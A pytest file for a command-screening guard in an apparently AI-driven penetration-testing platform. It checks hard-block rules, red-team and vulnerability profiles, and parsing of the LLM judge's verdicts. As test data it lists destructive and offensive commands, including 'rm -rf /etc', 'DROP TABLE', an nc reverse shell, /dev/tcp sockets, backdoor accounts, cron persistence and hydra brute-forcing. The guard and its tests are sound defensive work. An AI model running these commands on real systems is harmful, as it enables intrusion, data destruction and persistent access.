from __future__ import annotations

import pytest

from axiom.modules.guard.defaults import HARD_BLOCK_RULES, SYSTEM_PROMPT
from axiom.modules.guard.policy import evaluate
from axiom.modules.guard.policy import _external_operation, _parse_verdict, normalize
from axiom.modules.guard.schemas import GuardRequest
from axiom.modules.settings.schemas import RuntimeConfig


def _task(client, *, enabled: bool) -> dict:
    project = client.post("/api/v1/projects", json={"title": "Guard"}).json()
    return client.post(
        "/api/v1/tasks",
        json={
            "project_id": project["id"],
            "title": "监管",
            "origin": "a.example.com",
            "guard_enabled": enabled,
        },
    ).json()


def _mode(client, mode: str) -> None:
    current = client.get("/api/v1/settings/runtime").json()
    config = current["config"]
    config["guard_mode"] = mode
    response = client.put(
        "/api/v1/settings/runtime",
        json={"actor": "test", "expected_version": current["version"], "config": config},
    )
    assert response.status_code == 200, response.text


def _update_guard(client, **changes) -> dict:
    current = client.get("/api/v1/settings/runtime").json()
    config = {**current["config"], **changes}
    response = client.put(
        "/api/v1/settings/runtime",
        json={
            "actor": "test",
            "expected_version": current["version"],
            "config": config,
        },
    )
    assert response.status_code == 200, response.text
    return response.json()


def _decide(client, task: dict, command: str) -> dict:
    response = client.post(
        "/api/v1/internal/guard/pre",
        json={
            "project_id": task["project_id"],
            "task_id": task["id"],
            "intent_id": "i001",
            "phase": "explore",
            "worker": "worker-a",
            "tool_name": "bash",
            "input": {"command": command},
        },
    )
    assert response.status_code == 200, response.text
    return response.json()


def test_guard_is_task_scoped_and_hard_rules_block_only_when_enabled(client) -> None:
    disabled = _task(client, enabled=False)
    assert _decide(client, disabled, "systemctl restart nginx")["source"] == "disabled"

    enabled = _task(client, enabled=True)
    decision = _decide(client, enabled, "systemctl restart nginx")
    assert decision["decision"] == "BLOCK"
    assert decision["source"] == "hard_rule"
    assert decision["event_id"].startswith("evt_")

    events = client.get(
        "/api/v1/audit-events",
        params={"task_id": enabled["id"], "event_type": "guard.decision"},
    ).json()
    assert events[0]["payload"]["decision"] == "BLOCK"


def test_guard_audit_mode_records_block_but_does_not_interrupt_worker(client) -> None:
    task = _task(client, enabled=True)
    _mode(client, "audit")

    decision = _decide(client, task, "rm -rf /etc")

    assert decision["decision"] == "ALLOW"
    assert decision["observed_decision"] == "BLOCK"
    assert decision["observed_reason"]


def test_guard_audit_preserves_review_run_owner(client) -> None:
    task = _task(client, enabled=False)
    response = client.post(
        "/api/v1/internal/guard/pre",
        json={
            "project_id": task["project_id"],
            "task_id": task["id"],
            "review_run_id": "vr000001",
            # Only Explore is audited now; this test is about the owning run
            # surviving into the record, so it issues an explore-phase request.
            "phase": "explore",
            "worker": "reviewer-a",
            "tool_name": "read",
            "input": {"path": "review_target.json"},
        },
    )
    assert response.status_code == 200, response.text

    events = client.get(
        "/api/v1/audit-events",
        params={"task_id": task["id"], "event_type": "guard.decision"},
    ).json()
    assert events[0]["review_run_id"] == "vr000001"
    assert events[0]["payload"]["phase"] == "explore"


def test_guard_audit_preserves_plan_run_owner(client) -> None:
    task = _task(client, enabled=False)
    response = client.post(
        "/api/v1/internal/guard/pre",
        json={
            "project_id": task["project_id"],
            "task_id": task["id"],
            "plan_run_id": "pr000001",
            "phase": "explore",
            "worker": "plan-worker",
            "tool_name": "read",
            "input": {"path": "manifest.json"},
        },
    )
    assert response.status_code == 200, response.text

    events = client.get(
        "/api/v1/audit-events",
        params={"task_id": task["id"], "event_type": "guard.decision"},
    ).json()
    assert events[0]["plan_run_id"] == "pr000001"
    assert events[0]["payload"]["phase"] == "explore"


def test_guard_fails_open_for_normal_external_operation_without_model_config(client) -> None:
    task = _task(client, enabled=True)
    decision = _decide(client, task, "curl https://a.example.com/health")
    assert decision["decision"] == "ALLOW"
    assert decision["source"] == "fail_open"


def test_guard_policy_fields_are_persisted_and_drive_the_next_decision(client) -> None:
    task = _task(client, enabled=True)
    updated = _update_guard(
        client,
        guard_whitelist_tools=["read", "custom-safe"],
        guard_whitelist_bash_verbs=["echo"],
        guard_profiles={
            "vulnerability": {
                "system_prompt": "仅按当前授权范围判断。",
                "hard_block_rules": [
                    {
                        "reason": "禁止触碰标记文件",
                        "pattern": r"touch\s+/tmp/blocked",
                        "enabled": True,
                    }
                ],
            }
        },
    )

    assert updated["config"]["guard_whitelist_bash_verbs"] == ["echo"]
    assert updated["config"]["guard_profiles"]["vulnerability"]["system_prompt"] == "仅按当前授权范围判断。"
    assert _decide(client, task, "echo ok")["source"] == "whitelist"
    blocked = _decide(client, task, "touch /tmp/blocked")
    assert blocked["decision"] == "BLOCK"
    assert blocked["reason"] == "禁止触碰标记文件"
    # The removed default rule must no longer be silently applied.
    assert _decide(client, task, "systemctl restart nginx")["decision"] == "ALLOW"


def test_guard_rejects_an_invalid_configured_regex(client) -> None:
    current = client.get("/api/v1/settings/runtime").json()
    response = client.put(
        "/api/v1/settings/runtime",
        json={
            "actor": "test",
            "expected_version": current["version"],
            "config": {
                **current["config"],
                "guard_hard_block_rules": [
                    {"reason": "坏规则", "pattern": "(", "enabled": True}
                ],
            },
        },
    )

    assert response.status_code == 422
    assert "invalid guard regex" in response.text


def test_guard_treats_native_browser_tools_as_external_operations() -> None:
    assert _external_operation({"tool_name": "browser_click", "command": "{}"})
    assert _external_operation({"tool_name": "browser_read_network", "command": "{}"})


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ("passwd alice", "修改或重置用户密码"),
        ("systemctl restart nginx", "停止或重启业务服务"),
        ("crontab -e", "修改系统或服务配置"),
        ('echo "x" > /etc/nginx/conf.d/test.conf', "修改系统或服务配置"),
        ("userdel alice", "篡改账户或权限体系"),
        ("rm -rf /etc", "删除或大规模破坏关键数据"),
        ("psql -c \"DROP TABLE users\"", "删除或大规模破坏关键数据"),
        ("ab -n 100000 https://target.example", "高并发或 DoS 操作"),
    ],
)
def test_default_hard_rules_block_explicit_destructive_commands(command: str, reason: str) -> None:
    config = RuntimeConfig(guard_mode="enforce")
    decision = evaluate(
        GuardRequest(tool_name="bash", input={"command": command}),
        config,
    )
    assert decision.decision == "BLOCK"
    assert decision.source == "hard_rule"
    assert decision.reason == reason


@pytest.mark.parametrize(
    "command",
    [
        "cat /etc/passwd",
        "curl https://target.example/api -d 'reset_password=true'",
        "curl https://target.example/api -d \"DROP TABLE users\"",
        "curl https://target.example/upload -F file=@webshell.php",
        "hydra -l admin -P passwords.txt target.example http-post-form",
        "ffuf -w paths.txt -u https://target.example/FUZZ",
        "nmap -sV target.example",
    ],
)
def test_default_hard_rules_do_not_block_normal_security_testing(command: str) -> None:
    config = RuntimeConfig(guard_mode="enforce")
    decision = evaluate(
        GuardRequest(tool_name="bash", input={"command": command}),
        config,
    )
    assert decision.decision == "ALLOW"


def test_default_judge_prompt_preserves_allow_first_contract() -> None:
    assert "默认放行" in SYSTEM_PROMPT
    assert "1:只读健康检查，不影响目标" in SYSTEM_PROMPT
    assert "0:会清空生产库" in SYSTEM_PROMPT
    # The reason travels back to Explore as the block message.
    assert "Explore worker" in SYSTEM_PROMPT
    assert "20 个汉字" in SYSTEM_PROMPT
    assert "SQL 注入" in SYSTEM_PROMPT
    assert "上传 WebShell" in SYSTEM_PROMPT
    assert "大规模压测" in SYSTEM_PROMPT
    assert len(HARD_BLOCK_RULES) == 6


def test_verdict_only_accepts_zero_or_one() -> None:
    assert _parse_verdict("1") == ("1", "")
    assert _parse_verdict("0") == ("0", "")
    assert _parse_verdict("  1\n") == ("1", "")
    assert _parse_verdict("`0`") == ("0", "")
    assert _parse_verdict("**1**") == ("1", "")
    assert _parse_verdict("0\n解释：会破坏业务") == ("0", "")
    # Anything that is not a leading 0/1 stays unanswered, which keeps the
    # fail-open default instead of inventing a verdict.
    assert _parse_verdict("ALLOW") == ("", "")
    assert _parse_verdict("阻断") == ("", "")
    assert _parse_verdict("") == ("", "")


def test_verdict_carries_a_short_reason_back_to_the_worker() -> None:
    # The reason travels to Explore as the block message, so it is parsed off
    # the same line and capped.
    assert _parse_verdict("0:会锁死管理员账号") == ("0", "会锁死管理员账号")
    assert _parse_verdict("1：只读探测") == ("1", "只读探测")
    assert _parse_verdict("**0**：清空生产库") == ("0", "清空生产库")
    assert _parse_verdict("0 - 修改密码") == ("0", "修改密码")
    # Models drift from the bare contract even when told not to; a measured
    # reply was "判定:0:经 bsk 访问公网第三方接口".  Locate the digit rather than
    # require it to lead, otherwise a real BLOCK silently becomes fail-open.
    assert _parse_verdict("判定:0:经 bsk 访问公网第三方接口") == ("0", "经 bsk 访问公网第三方接口")
    assert _parse_verdict("判定：1:只读") == ("1", "只读")
    # A number that merely contains 0/1 is not a verdict.
    assert _parse_verdict("10") == ("", "")
    assert _parse_verdict("2") == ("", "")
    assert _parse_verdict("0:") == ("0", "")
    long_reason = "0:" + "x" * 80
    assert len(_parse_verdict(long_reason)[1]) == 40


def test_profiles_diverge_on_persistence() -> None:
    config = RuntimeConfig(guard_mode="enforce")
    persistence = [
        "ssh root@10.0.0.5 'echo \"* * * * * id\" | crontab -'",
        "useradd -m backdoor",
        "systemctl enable evil.service",
    ]
    for command in persistence:
        vuln = evaluate(GuardRequest(tool_name="bash", input={"command": command}), config, "vulnerability")
        red = evaluate(GuardRequest(tool_name="bash", input={"command": command}), config, "red_team")
        # Red team keeps persistence; a vulnerability assessment never does.
        assert red.decision == "ALLOW", command
        assert vuln.decision == "BLOCK", command


def test_red_team_profile_lets_the_worker_manage_our_own_host() -> None:
    # The operator allowed the worker to modify the AXIOM host freely, so our
    # own directories are exempt while a client's paths still block.
    config = RuntimeConfig(guard_mode="enforce")
    for command in (
        "rm -rf /opt/axiom/src",
        "rm -rf /var/lib/axiom",
        "rm -rf /var/lib/bsk",
        "rm -rf /etc/caddy",
        "find /opt/axiom -delete",
        "cp /tmp/x /var/lib/axiom/auth_secret.key",
        "bsk daemon revoke --all",
    ):
        decision = evaluate(GuardRequest(tool_name="bash", input={"command": command}), config, "red_team")
        assert decision.decision == "ALLOW", command

    for command in ("rm -rf /etc/passwd", "rm -rf /var/lib/postgresql", "rm -rf /", "rm -rf /home/user"):
        decision = evaluate(GuardRequest(tool_name="bash", input={"command": command}), config, "red_team")
        assert decision.decision == "BLOCK", command

    # The exemption is red-team only; a vulnerability assessment never deletes
    # anything under our tree either.
    decision = evaluate(
        GuardRequest(tool_name="bash", input={"command": "rm -rf /opt/axiom/src"}), config, "vulnerability"
    )
    assert decision.decision == "BLOCK"


def test_profile_falls_back_to_global_fields_for_unknown_modes() -> None:
    config = RuntimeConfig(
        guard_mode="enforce",
        guard_hard_block_rules=[
            {"reason": "自定义规则", "pattern": r"touch\s+/tmp/blocked", "enabled": True}
        ],
        guard_profiles={},
    )
    decision = evaluate(GuardRequest(tool_name="bash", input={"command": "touch /tmp/blocked"}), config, "bootstrap")
    assert decision.decision == "BLOCK"
    assert decision.reason == "自定义规则"


def test_guard_audits_only_explore(client) -> None:
    task = _task(client, enabled=True)

    def post(phase: str) -> None:
        client.post(
            "/api/v1/internal/guard/pre",
            json={
                "project_id": task["project_id"],
                "task_id": task["id"],
                "intent_id": "i001",
                "phase": phase,
                "worker": "worker-a",
                "tool_name": "bash",
                "input": {"command": "curl https://target.example/api"},
            },
        )

    post("explore")
    post("bootstrap")
    post("reason")
    post("plan")
    post("review")

    events = client.get(
        "/api/v1/audit-events",
        params={"event_type": "guard.decision", "task_id": task["id"]},
    ).json()
    assert events, "explore decisions must be recorded"
    assert {event["payload"]["phase"] for event in events} == {"explore"}


def test_guard_disables_model_thinking_by_default(client) -> None:
    # A reasoning model spends max_tokens on think tokens before the digit:
    # measured 5.5-12.2s per call against a 3s timeout, usually timing out.
    config = RuntimeConfig(guard_mode="enforce")
    assert config.guard_thinking_enabled is False


def test_network_capable_commands_are_not_treated_as_local() -> None:
    # These reach the network without a literal URL or a known verb, so the old
    # detector filed them as "local operations" and never consulted the judge.
    for command in (
        'python3 -c "import requests; requests.get(h)"',
        'python3 -c "import socket; s=socket.socket()"',
        'perl -e "use IO::Socket::INET"',
        "exec 3<>/dev/tcp/1.2.3.4/4444",
        "nc -e /bin/sh 1.2.3.4 4444",
    ):
        assert _external_operation(normalize("bash", {"command": command})), command

    # The same python3 -c form, doing local work, must stay exempt - the worker
    # uses it for nearly all housekeeping.
    for command in (
        'python3 -c "import json; d=json.load(open(\'graph.json\')); print(len(d))"',
        'python3 -c "import sys; print(sys.argv)"',
        "cat /var/lib/axiom/contexts/t_231/graph.json",
    ):
        assert not _external_operation(normalize("bash", {"command": command})), command


def test_own_workspace_paths_do_not_reach_the_judge() -> None:
    # 28 of 46 model blocks in the recorded run were this mistake: every worker
    # command cds into its own run directory, and the judge read that path as
    # "attacking our own platform" while the actual action was on the target.
    from axiom.modules.guard.policy import _only_touches_own_workspace

    own = [
        'R=$(ls -d /var/lib/axiom/sandboxes/t_231/workspace/axiom/runs/i106/lease_*); cd "$R"; '
        'python3 work/x.py > work/creds.json',
        "cd /var/lib/axiom/contexts/t_231 && ls -la",
        "cd /var/lib/axiom/tasks/t_231 && cat findings.md | head",
    ]
    for command in own:
        assert _only_touches_own_workspace(command), command

    not_own = [
        "rm -rf /opt/axiom/src",
        "cd /var/lib/axiom/sandboxes/x && rm -rf /etc/passwd",
        # A client-side write inside a command that also cds into our tree is
        # still the engagement, not housekeeping.
        "cd /var/lib/axiom/sandboxes/t_231/x/artifacts && rm -f 00_t.txt && curl https://shk.kkguan.com/q",
    ]
    for command in not_own:
        assert not _only_touches_own_workspace(command), command


def test_cleanup_of_own_object_is_not_a_deletion_to_review() -> None:
    # Blocking a rollback leaves the client's system dirty: i099 wrote two virtual
    # AP records, its three cleanup attempts were stopped, and the rows stayed in
    # the store's registry.
    from axiom.modules.guard.policy import _is_cleanup_of_own_object

    cleanup = [
        "GET /cgi/api/ap/delete/02:00:00:00:09:01",
        'curl -s -X DELETE "$B/ap/X11/X76901" -d \'{"apMac":"02:00:00:00:09:01"}\'',
        "curl -X DELETE https://h/user/173600780538880005/permissions -d 'i105_probe_self'",
        "curl -X DELETE https://kpos/goods/X11/X76901 -d 'AXIOM081001'",
    ]
    for command in cleanup:
        assert _is_cleanup_of_own_object(command), command

    # A delete of a client object carries no self-made marker.
    not_cleanup = [
        "curl -X DELETE https://target/api/orders/12345",
        'curl -X DELETE "$B/ap/X11/X76901" -d \'{"apId":104}\'',
        'curl -X DELETE https://h/user/623096269278580737/permissions -d \'{"resource":"abc"}\'',
    ]
    for command in not_cleanup:
        assert not _is_cleanup_of_own_object(command), command

    # One clean statement must not vouch for the rest of the command: the marker
    # only covers its own delete, and every delete has to be a rollback.
    assert not _is_cleanup_of_own_object(
        'curl -X DELETE \'https://t/api/ap/list\' -d \'{"mac":"02:00:00:00:09:01"}\' '
        "&& curl -X DELETE 'https://t/api/orders'"
    )
    # cd-ing into our own tree does not launder a client-side delete.
    assert not _is_cleanup_of_own_object(
        "cd /var/lib/axiom/sandboxes/t_231/x && "
        "curl -X DELETE https://h/user/623096269278580737/permissions -d '{\"resource\":\"abc\"}'"
    )
